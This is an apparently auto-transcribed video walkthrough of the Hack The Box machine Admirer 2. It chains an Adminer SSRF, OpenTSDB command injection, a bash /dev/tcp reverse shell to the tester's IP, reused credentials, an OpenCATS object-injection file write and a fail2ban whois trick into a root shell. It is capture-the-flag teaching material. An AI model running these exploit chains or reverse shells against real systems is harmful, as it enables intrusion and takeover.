 what's going on youtube this is ipsec i'm doing that myra 2 from hack the box and i really like this box because it's got a lot of small applications that have proof of concept exploits out for them but the application itself is configured in a way that you have to modify the proof of concept to get it working for instance the first exploit is an n minor which is like phpmyadmin there's an ssrf and the login functionality of the application however there's a plugin installed that disables login so you have to craft that login packet manually in order to trigger the ssrf that gives you access to a different application that has a command injection vulnerability but before the command injection vulnerability it does something with a metric in the application and the metric the proof of concept uses isn't in that application so it errors before it hits your command injection so you got to do some api queries to pull a valid metric to replace and the proof of concept script with access to the shell there's another web server that has a php object injection that you can use to write files however the web directory is not writable so you have to be creative with how you exploit it which triggers a rce and fail to ban but with that being said let's just jump in as always we start off with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats bring the nmap directory and call it admirer 2 and then the ip address of 1010 11.137 this can take some time to run so i've already ran it looking at the results we have just two ports open and it looks like one is filtered so the first port is ssh on port 22 its banner tells us it's a debian server the next thing we have is http on port 80 it's running apache and also debian the title of the web page is going to be admirer and the server header doesn't really mean that much we've already seen it we have filtered on port 4242 so we can't access this port this port is behaving differently so there's probably an iptables rule um dropping the traffic here so um keep that in mind so let's just go take a look at the web page because nmap doesn't really tell us too much so going to 1010 11.137 and it looks like we have a web page so the first thing i do look at the copyright information we can see it's 2018 which is a bit old um the next thing i'm going to do is try to find the extension so i'm gonna do index.html not found index.php it is found so this is going to be a php website looking at the source code the main thing i'm looking for here is something that exposes how this website was made maybe i see something says joomla wp-content things like that but i'm not seeing anything i'm just saying a bunch of uh probably a bootstrap website so let's run ferro buster so i'm gonna do pharaoh actually um i'm gonna start it real quick we can do dash u uh copy this let's see if i can get this right um i don't use this tool all that much yet so bear with me where i look at the help uh let's see ext let's see oh i remember i just did a video um we do i think dash e or dash x for extensions and we don't want to put a period first we just do straight uh php whatever i think if we updated to the latest version of favorite buster that is now fixed but i have not updated it yet so um have to make sure not to do that so let's copy this url again paste it in i always like the dash b to collect backup so when it finds index.php it tries like dot index.php.swap or something for vim files.back a bunch of um backup potentials so i always like adding that um it doesn't really add that much to your like word list because it only does it for items it actually found um then we do dash x for extension php and the final thing i like is output and i'm just going to call this durabus dot out and we're gonna let um this thing go uh we can take a look at the page itself maybe like check a robots.txt even though nmap should have told us i always just double check this and we get a not found message and this is a link and the link on this is actually exposing where it emails to so we have a host name admirer gallery.htb so let's go and add this to our host file so sudo vi etsy host we can say 10 10 11 137 paste this in and then go to admirergallery.htb and it's the same exact website so the next thing i'm going to try is a virtual host enumeration so i'm going to run go buster for this do vhost and then dash u we can put admire gallery htb word list up sec list discovery dns and i just do like sub domains top 1 million 5 000 is fine probably so let's run this and see what we have and it is going a bit slower that's probably because ferro buster is running and this tool is very fast so when you run it um your connection may slow down so i'm just going to kill this for now to speed everything else up and we do have one hit right now that's db.onmauergallery.hdb so let's take a look at this one so sudo vi etsy host and we can add this going to this link we have addminer that is admirer so um similar names uh my sql database if we click enter we log into the database i guess so this looks like a phpmyadmin type of interface i don't know exactly what addminer is looks like we are admirer read only potentially so if i go to gallery we have things let's see select select data so we can see things it doesn't look like we have any credentials i don't know how to use this user interface but we have this sql command so let's try this out and i wonder i am on so i guess this just isn't supporting dark mode um i can do show databases i believe execute this uh we have this so let's see um i wonder if i do show tables if i'm already in this database i am so i'm in gal uh the admirer database we can describe gallery to see this and we have um no password field so we already saw it we could do like select star from gallery if we really wanted to and run this and we just get the data so nothing interesting there um the other thing i like checking for when i have sql is select one into out file and then we can do like temp ipsec to see if it writes something execute this access is denied and this could be because we don't have the file privilege it could also be we don't have permission to write into this directory which is becoming more and more common um because there's something called like a secure file priv and my sequel so i just want to write try writing to like verily my sql files test because i think this is the default um allowed directory for my sql to be written to and there's also like app armor things like that so there's a lot of things that prevent my sequel from just writing to files and that's why typically you don't see me using like sql map os shell type commands because i don't think it's really been updated with the times maybe i just like doing things mainly so i know exactly what's happening and i can try to test for these small use cases the next thing i probably want to do is a load file command so select load file and we can try etsy pass wd and then execute and we get null so it doesn't look like we can um read files either so at this point i'm going to go for um enumerating the version i'm guessing the current version is 478 and the latest is 481 if i click this link we go to a download and it looks like the latest version is indeed 481 but we're probably running uh 478 so i mean if we're running 481 i have no idea why 478 would be shown so um let's do addminer 478 exploits and go to google real quick and see if there is anything we have a server side request forgery and this is interesting because i'm thinking back to the nmap we have port 4242 filtered and like i said it's probably iptables blocking us so if we do a server side request forgery we can access that port on localhost which will probably bypass that iptables rule so let's go to the security advisory see if there's anything here um trying to get details and it's elasticsearch and click house of this i didn't see anything elastic on at minor so looking at this advisory open in firefox and let's see copy the python script and looking at this python script it's a redirect like it's redirecting things it is written in python 2 because a simple http server so when we run this we're going to make a python 3 version because i don't like python 2. um i don't see any exploit code here all this is probably doing is at miner makes a request to us we send a redirect back to it and direct it somewhere else um if you've watched like my jarmus video it's a box i had created that looks like it's a similar attack so far so here we have a login and what we didn't get a login when we access this so if i go to db admirer gallery we just have enter and we got server whatnot um let's see i'm gonna run gearbuster on this and the reason why i'm wearing gearbuster not fair buster is i don't want to recurse into directories and i don't remember the syntax off the top of my head to not do that so this is going to be quicker for me right so web content um where is it raft small words dot text and there we go we have a plugins directory so if we go to slash plugins uh one click login plugin.php data um if i search this with adminer maybe this is a plugin we need to make sure this goes to google and yes this is um a plug-in for addminer it looks like so i'm guessing that's what this button does and the normal login is probably going to look like this where we have to enter credentials so this is a bit unique if i intercept this in burp suite we go to target proxy intercept is on click enter and we have credentials we have admira read only and i want to be admired and then to exclamation point so we have some type of password here um i'm guessing if we follow and do the ssrf so 10 10 14 8 putting it there where it was localhost we should listen on port 80. we for this along we don't get a hit so we probably have to do something else to do an elastic search login and we could probably guess this it's probably going to be um let's see we go here if you look over here we have auth driver server it's probably going to be in this parameter but what i generally do is um always test it against like i like spinning up software and then testing it locally so man my dark mode plugin is really not working but besides the point um let's see and miner doctor we can just google this go here did i turn it off oh it's on okay and we can do a pull let's see just docker pull and minor and i have docker installed so i can do sudo docker already copy the whole thing do this and um it is installed so it didn't actually download and you can just do docker run right so docker run and then map the port with dash p so i do sudo docker run dash p by default it's showing it runs on port 8080 i don't want to do 8080 because that's where burp is so i'm going to do 8081 maps to port 8080 this is localhost going into docker container on port this and we do add miner and it looks like it is started so now if i go to localhost 8081 we're here and we can see over here all my get requests so we're definitely accessing my version of addminer i can click this see the different login types and we have elasticsearch so if i examine this request let's go proxy intercept on put stuff in this we can see the driver is elastic so that's what we want to change so let's go back to this page i am intercepting enter change server to elastic change localhost to 101014.8 and then are we still listening on port 80 we are right here i can kill that go buster oh we can kill that doctor as well so i'm going to for this request and it makes a request to us uh authorization this is probably just going to be the password that we saw although it looks pretty small um it didn't put a password at all so we have the server side request for dre now so the next piece is we have to do a redirect and on the official like github script for this exploit it was python 2 and i didn't like that so i'm just going to google python3 http server redirect example maybe and see if we can find one um let's see simple http redirect this is again using simple http server i don't think that's a python three thing so let's see is this gonna be it here we go we have this so i can v redirect dot pi paste this and we can test this out because it looks like argument one is going to be a port and then argument two is used for the redirect so if i do sudo python3 redirect.pi 80 and i'm going to say google.com and if i test this out with a curl curl v 10 10 14 8 we see i sent a redirect to google.com we can see my server head or whatever but um everything looks like it is working swimmingly so what we want to do is try redirects on this application so i'm first i'm going to try like etsy passwd to see if i can get this to um redirect and give me a file so let's go back to adminer where am i in um let's see proxy intercept login go to repeater and change this to elastic and then the server 10 10 14 8 send it we get a found refresh we didn't get anything that's weird um let's see elastic 10 10 14 8 4 turn intercept off and oh god it's getting a bunch of things you can see it's just like i don't know there must be some type of bug maybe in the server but it's like just trying it a hundred times so oddly enough it didn't like when i did it in the repeater window so i guess maybe there's some javascript that it submits so in order to make this a bit easier for me i'm going to just do it all the time in the browser but i don't want to like hit um like do the edit 50 times so i'm going to go into burp options and go down to match it and replace i'm going to say request param value and say anything that is local host change it to 10 10 14 8 and then i'm going to add another one let's do another parameter value this one's going to be server i'm going to change that with elastic so now as long as my request goes through burp suite when i click enter it's automatically going to change those parameters for me so if i run this again just hit ok and then it works um we can see it's using a file get contents um but it's doing http colon slash well that is getting to me i'm guessing this is like hiding the credentials but i don't know why i can't redirect into the file wrapper maybe php just doesn't support that we could try like the php wrapper like i think it's um filter convert dot base64 encode resource is equal to etsy passwd maybe i think that's right click it again and it's doing that same weird behavior so i'm going to direct this to http localhost let's just direct it to um like itself and see what happens and right off the bat we're just getting the html source code of that very first port port 80 that like static website so um nothing too interesting we can change this to be 4242 i'm going to just clear my screen then we click login again and we have something else we have open tsdb and it's also telling us we must be running javascript so let's look at exactly if there's any exploits for this so open tsdb exploit go to google um remote code execution very first result um looking at this it looks like we may have something right here so let's try copying this parameter and just seeing what happens i'm going to leave it with the touch because i just want to see what happens here so i'm going to do does this use single quotes it's using single quotes where the system command is so i'm going to put this in double quotes there we go so oddly enough there's no space here so i don't know if that's going to break something or not but we can run this then we go back to um the login click enter and we get a big ol java error message so going down to the bottom what can we see um no such name for metrics sys.cpu assist yeah.cpu.nice so this is an interesting error message from this application if i copy this going over to google see what we have um i know it's not even getting to the rce portion because um like this is a java error um it would say like can't write file something like that i believe so we want to fix this metric issue first and i'm not really seeing any thing in here so let's see if we go here not seeing much let's see this is still using says cpu um auto create metrics so we probably want to look more into this application so i'm going to look at open ts db api documentation to see if this even has one it does and the reason why i'm using uh apis is because right off the bat when i try to access this website it said um javascript is required apis don't require javascript so i should be able to access this no problem uh verbs we can only use the get verb in our ssrf unless maybe we could tunnel gopher or something through this ssrf request but i don't believe we can um mainly because i couldn't even do the file parameters so i'm not even going to try gopher so we have this api endpoints we have query search serializer stats suggest let's say what suggest is and api endpoint provides auto complete so for example passing type metrics qsys will return the top 25 metrics that start with sys so this is pretty cool so if i go to slash api suggest and type metrics what if i don't specify any query if it just gives me all the potential um things if it doesn't give me all the potential queries then i'm going to have to um like start brute forcing things so i'm going to go with like give me everything that starts with a give me everything that starts with b type deal but um let's just run this so we're now going to redirect to api suggest type metrics and if we looked at our poc uh our metric does have that says cpu nice so that's the string we want to change so change my redirect let's go log in again we hit it and we have http statsweb hits so i'm going to copy this and we can go back to this and we will replace the metric with one that exists hit enter it got it and we have output so the first thing i want to do is try a ping so let's do system and i'm going to ping c 1 10 10 14 8 and then we can do sudo tcp dump dash i ton zero icmp and add the dash n so we don't res uh do dns resolution click ok um i did not redirect there we go we get invalid credentials which isn't what we got before when the last thing so um if i run this let's see if i do curl dash v local host we can see this location has spaces which is not a valid url so we have to url encode these spaces um we probably i wonder if we can do pluses it's either plus or percent 20 or it's both so i'm going to try pluses first and then if i make this request we can see the spaces have turned to plus um run tcp dump again click enter and now we have pings so um i think we could have also done uh percent 20 as well and that works birthers or a space um so if i do percent 20 there just because i'm lazy i didn't want to do it the four times it existed or whatever um oh one percent 20. i wonder if we can't like mix it i swear when i originally did this box i use percent 20 not plus so ping 20 c 1 20 ip okay let's try this click enter get huh okay we'll just do spaces uh pluses maybe that's what i did maybe i'm or maybe i screwed something up let's do that plus plus plus go oh shoot i did screw something up no i didn't that's right let's see there we go enter hit this definitely pinged us i'm so confused i use the up arrow to generate this huh um i'm not sure what's going on it's not at first but that is definitely bizarre i guess we can try a reverse shell what's the worst that can happen it won't work so bash dash c um let's see i don't need to do bash to see i can just do this because i'm going to base64 and code this so dev tcp 1010 14 8 9 000 1 0 and 1 like this that looks right base wrap zero and i'm definitely definitely definitely going to make my base64 alphanumeri or yeah just alphanumeric getting rid of all the um special characters i think i just did that let's see i'm going to copy this and i always when i make those types of changes i'm just going to run this myself real quick so we do this get a shell shell works okay so we can do echo plus that pipe it over to base64 plus dash d and then bash 9001 run this hit enter and we get a shell so i'm going to do uh python 3 c import pty pty dot spawn bin bash control z stty raw minus echo fg enter enter and we can export term is equal to x term so i can clear the screen normally at this point i'd run lin p's and just look at the output but it's not really that exciting to do it every video so let's just take a look at the passwd file um looking at all accounts above 1000 so we have my account i don't know what hbase is um it's running in opt hbase so if i look at that i don't know what it is uh we have whatever that guy is mysql jennifer jennifer has bash um [Music] exim so we got a mail server here i don't think this is default on every debian box i don't know i haven't looked at my a lot of debian boxes and this is something that i like i mean people can get dependent on running enumeration tools right that just tell you what to do but when you look at it and chunks and do things manually you notice things like this like huh has this debian exam always been on these debian boxes i don't know because um i guess you'd maybe it's just me but i'm looking at smaller chunks so i notice more things and when i ask these questions the next time i go into debian box i'm going to look at it and see if that stands out i'm guessing um exam 4 is not a default uh package so this probably stands out as being important we also have the develo user he has no logon or no login we um can etsy pass wd grep for everything that ends in sh uh put in quote oh like that and we have just bash and jennifer i'm guessing jennifer is where user.txt is um only users can read it if i do a groups i am not a member of users so i cannot read home jennifer user.txt so we probably want to get there and what i'm going to do first let's go into this op directory we have opencats and hbase we exploited open cats i believe is that what we did what was this um [Music] see we did that let's see oh we did open tsdb not cats but let's see is there anything here we have a db if i cat we got sql um let's see find dot grep config there is a config.php let's less this is there a password in here forgot password demo login let's see grep i pass config dot php okay let's see i do not see anything maybe this isn't running like my sequel find dot grep sql i'm not sure how this is exactly running it's definitely got a database um see let's go to etsy apache we have our own apache configuration for open cats that's weird what's in just the regular apache site's enabled default see db ver dub dub dub and miner so let's just take a look at at miners config real quick let's see three files what's in plugins so now we can look at um this data directory and there's servers.php and we have credentials to something so we should have tried this credential first for the user so we can do su-jennifer try this password and that one doesn't work we did see this one when we intercepted the request so the plug-in is reading data out of their server.php and just auto-inputting it right and the reason why i'm not doing the username and uh mira because we looked at passwd and news that doesn't exist if i ask you boom we have it so i'm going to leave this shell up let's see we can kill this session kill this session but i always like getting a ssh shell when i can so jennifer at 10 10 11 137 paste in this password and now we have a better shell and if something happens to this we still got that netcat session to fall back on so i'm not exactly sure what this jennifer user is we can look at the home directory we got the user.txt but there's nothing really here i'm going to do a find dash find slash user jennifer and then pipe errors to devnol just to see what there is we probably don't want proc and let's see we can ignore proc and run and we'll do cis fs so there's not really much we have pts because we're ssh den and then just my home directory i'm going to try let's see if i do groups i'm a member of users so i'm going to do dash group users and see anything and nothing just this so this show doesn't look like it bought me anything other than user.txt so i'm kind of at lost what to do however there was the open cats that i saw in opt and hbase if i do ss lntp we do have port 8080 open and if i looked at etsy apache 2 dash open cats i don't know why there's two like apache configs this could have been done like in multiple sites but it's probably a reason we can see virtual host 8080 and going down that is it so let's see what else is in this so if i go in this config let's look at apache2.com see i'm going to diff this apache and the other apache and this is probably why there's two different apaches installed so i mean like to me when i look at this if we look at the other apache config this may make more sense so dot dot slash apache 2 sites enabled we can see there is a site on port 80 and then if we go down past this we have another site on port 80 but this one is for db admirer.htb i was kind of curious why they didn't do virtual host port 8080. so that's why i did the diff against the configs to see if apache was configured differently and we do see in the opencats apache 2 is configured to run as the user devel so the users that are running apache is different um if we do ps ef um is it dash force dash dash force probably dash dash uh [Music] maybe i can't [Music] see i don't think i can see other people's things um mount grep i forget what it is there's a mount option you can do to hide um the pid oh there it is so hide the id is set to two so users on this system can't see the processes of other users that's what hide pid is i guess we should just for the port then so i'm going to begin my first line with squiggly c you can see i can type that there but if it's the first character entered on a line we have that i'm going to listen on port 8082 because i already used 8081 for something and then do localhost 8080. so this way on my local box whenever i send a request to 8082 it's going to send it through ssh and going to localhost 8080 on the other end so now i can do localhost 8082 and we have opencats and it tells us the version i really like when applications tell me the version there so we can do open cats version uh let's see do this exploit and see if there's anything it looks like there is a php object injection and it is um an authenticated one most likely i bet if i actually read this it would let's see off it's not saying it but this page makes it look like it is authenticated so we should try logging in we can try like admin admin maybe we could go view the config but the first thing i'm going to do let's see ssh gen i should have taken a better note of that password but i'm just going to copy it i'm going to try to log in with the credentials we have so jennifer paste this in and we can log in to open cats so that is good should go through the exploit so we send a request let's see i'm guessing this is a php object right here um talking about it's unserializing to data grid we can do a pop gadget chain with guzzle http and it can write files to the system so let's see the giving us php gadget chain collection i think that's what it's called and giving us the command to use and it's writing to verb dub ver www.publicshell.php but um we don't want to write there right because that's not where um this web server is we want to get to the develop user and that is in um i think opt yeah cd opt and oh open cats is owned by root so i don't know if we'll be able to write any files here um let's see find dot dash writable so this is gonna see if there's anything worldwideable in this directory there isn't um let's see dash user devel nothing's owned by the user devel he's also in the group devel i believe um if i can spell that correctly we have install block that's owned by the group devel but the group can't write to the file so we can't write a web shell into this directory so this whole php gadget chain isn't going to help us right now so we have to do some more enumeration on the box the first thing i always think about is like ssh keys because if we can write an ssh key then we can log in but if we look at um devel he has no login so reagan essays ssh key won't really help us um we could still do like port forwarding however we can do that with the jennifer account so it doesn't buy us anything we could um use scp most likely to download files so i'm going to do find slash user devel and then hide error messages so dev null and we don't have anything so let's try group as well and we know this install block we have use a local source and use a local etsy which is weird if we look into these directories so let's just copy this paste they are blank um let's do user local and source develop can write and etsy develop and write um whenever there's local that generally means this is going to be a user managed thing so package managers don't really touch those directories so that's interesting um if we go to var log we can see let's see what software is installed uh php we have open tsb we can't read a lot of these files but it's still helpful because we can see like exam four uh we have failed a man and i do remember failure ban had an exploit in the news somewhat recently so i'm just going to google fail to ban exploit go to google and we have this post once it loads and i'm gonna skim it over um it's a exploit when it does who is so fail to ban um that little clip is annoying but i can't highlight it we see that action band it's doing print f and then printing out a message and the key piece is it's going to print the output of this who is command now what this is saying is the male binary if the line begins or you have this squiggly exclamation point it will execute the command so what we're going to do here is hijack the who is and then change this output to execute a command so that is essentially it we could do like a um let's see fail to ban server v maybe um that didn't work let's see dash h there's help we can see it is version 10 uh 0 10 2. i'm sure one of these posts will tell us that is vulnerable but i'm not going to spend too much time there you should always enumerate versions um so we have a piece um we don't know what like the who is config because it's probably in like who is dot confir doesn't exist but we couldn't write to that directory however we can write to the user local etsy directory which maybe that's where who is is i'm going to run the s trace and do who is 10 10 14 8 or we can do 12701 it doesn't really matter the main thing i'm looking for is this output because we can see everything that whois binary is doing um most importantly we can see um like any file open that fails right so this is opening etsyresolve.com doing probably a dns lookup ns switch and here it is we have it opening user local etsy who is dot conf no such follow directory so awesome um the devel user can write to this directory so we can create a whois configuration file to port to point whois commands at our box which then we can respond with to um [Music] have the fail to ban um like uh filter band to actually execute a command when it does the who is so it's a bit of a tricky concept but the first piece that we need to do is be able to write a file into user local etsy whois.com so we go back to the opencats exploit and we want to use this php gadget chain thing if you just do that github you can find it i probably haven't installed an opt already so you can probably just get pull this thing so i'm going to copy this and we'll copy up until where we store the file and then the file we want so i'm going to go on my host and we can do a new pane i'm going to do exploit i'm going to put ipsec was here and save that because i just want to write this first um if i can write that then we can change it later so opt phpg cc we have that um user local etsy i'm going to do test we'll change it to whois.com once we're done and we can write this exploit okay and then how do we do this um php object goes there so let's copy this whole piece i'm gonna make sure i'm still logged in i should be and i need to put the slash here and copy this paste and then let's do ls user local etsy so nothing exists in this directory hit enter and we have test so if i do test we have a file and now the bad thing is it didn't write our input at the beginning of the file so like if we try to write a config file here um this probably isn't going to work because you got this json ahead of it so we do have to do some trickery here and before we get into this the best way to go about this is probably to look at the actual whois source code to see how it does something um or we can like do an example whois.com so you can see what it should look like so we have this and the configuration file is um something and then this so at a quick glance this looks like a regular expression and it's escaping a period and saying aarp and then this is terminating the string and who is so if this is indeed a regular expression and this is where the request goes we can probably just put an ip address here we don't need host names those are usually interchangeable we may be able to change our request actually because in regular expressions what's in between a bracket is an or right so what we're going to do is we have this right and if we put a bracket here then this is still going to match we just like terminated the regular expression think of it like when you do an sql injection you add your single quote to terminate the query this is very similar we just terminate the regular expression with this and we have ipsec was here and the only issue we have now is what is at the end of this so somehow we have to get rid of this information and this is where examining the whois source code comes in handy so if i just google who is source code let's see intelligent who is client oh god who is dot c there we go i believe it's going to be in this file somewhere um let's see where are you so handle query see match config file this is what we want so the delimiter is going to be a space or a tab the buffer is 512. so if we give it over 512 probably it's going to break let's see how is buffer used what is this uh buff oh so f gets i was hoping it would highlight everything but yeah so we're getting the config file here and only getting 512 bytes so we could test this theory out let's go back to our gadget chain um let's see uh where is it we called it exploit so i'm going to do python dash c um oh it's hard to test that actually because that it's not when we write the file it's when the who is binary is reading it but um we have that it's got the regular expression here so let's just try that real quick so we know who is is going to be a regular expression and we know it only reads 512 lines so what we want to do is print a closed bracket and then a star so this is going to match things and then 10 10 14 8 10 10 14 8 and then we want to um print 500 spaces um this number doesn't matter we just want to go over that 512 character buffer so if i write this to exploit if we look at this we just have all this data so remember this bracket stir is just terminating the regular expression if we went back to the whois comp we see they're just starting with backslash period but um we're just ignoring like using this to break or json and then when someone looks up 10 10 14 8 we probably could do like um another star or something so when they look up anything but i'm just going to put my ip here so when they do a who is on 10 10 14 8 because the failure ban is going to block us and that does a who is on our ip to see who we are to put it in the email saying hey we blocked this ip here's the information about it and then we're telling it the location of 10 10 14 8 is us so we can respond to it and that's we're going to print that message then do the squiggly exclamation point to do command execution so that is a long chain right um let's do this whole gadget chain thing again and this time we're gonna do whois.com we can copy this piece and who is i believe is on port 40 it's either 43 or 42 um but we're going to run a who is first just to make sure this is working so we send this file we go back to our shell and we can cat this echo and we see it looks good again this regular expression should be terminated and then who is is only going to grab 512 bytes so it's going to grab like up to here and then see this right so pseudo nc lvnp 43 who is 10 10 14 8 and we see it makes her request to us i guess i should ran that before so you saw it wouldn't make the request um otherwise i bet i could do i can't press that line let's add that let's see do this i wonder if i'm going to challenge my understanding of this because i'm partially making stuff up as i go um so i'm going to say 10 10 14 4 here i'm going to send that to 10 10 14 8. let's see what happens here so making this up as i go hopefully my understanding of this is correct if not you'll be as confused as i am about who is this legacy protocol but hopefully this works i didn't actually test this so yeah i do who is 10 10 14 4 it still gets to us because we're directing that request to us right so that is good um now what we have to do is the um actual exploit so i'm gonna do like let's see um do they give us an exploit in this post let's see next line be executed so they're just doing a file and then like that okay so we can do it this way um v we'll call this fail to ban and then i'm gonna call this please subscribe we don't really need anything here um then in line break squiggly enter like that yep and then we can do bash dash c bash dash i dev tcp 1010 14 8 9001 i'm kind of curious if this works because we do have some bad characters in here so that looks better so now if i nc lvmp 43 pipe failure ban in me um pseudo and we probably want to ssh 10 10 11 137 nclvnp 9001 and um let's see if i look at this that is still there oh we need this to be 10 10 14 8 because it's going to look up my own ip address so we need to revert this so 10 10 14 8 go like that because field of band is going to run the who is 10 10 14 8 if it was left to 10 10 14 4 um it wouldn't work so do this copy this payload go to open cats paste 10 10 14 8 that is good 43 who's 43 right yes okay so let's get blocked well only took one attempt and we got blocked and we have the root shell right here so um success uh if we cat root our text we have it so hope you guys enjoyed the video take care and i will see you all next time